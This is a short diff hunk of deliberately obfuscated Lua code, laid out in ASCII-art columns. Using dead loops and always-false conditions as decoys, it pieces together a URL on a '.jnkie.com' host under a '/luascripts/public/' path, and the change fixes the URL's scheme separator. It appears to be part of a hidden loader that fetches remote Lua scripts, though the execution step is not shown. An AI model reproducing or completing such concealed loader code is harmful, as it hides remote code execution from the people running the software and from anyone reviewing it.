@@ -23,7 +23,7 @@
    ".jnkie.com";             s='/                           's='/'Q="v"..
    "1/luascri"..             "p"..                          "ts/public/";
    while 0~=0 do             qHAT="                         0"..tostring(
-   12311)end;WOD             =A..C..                        `:` ..E..O..s
+   )end;WOD=A..C             ..`://`                        ..E..O..s..""
    ..E..s..Q..(A             and"")..                       "13e701677"..
    (qHAT=="3"and             8/31/412                       or"a42a72cd")
    .."76c380631"             ..(19==91                      and"a"or"")..
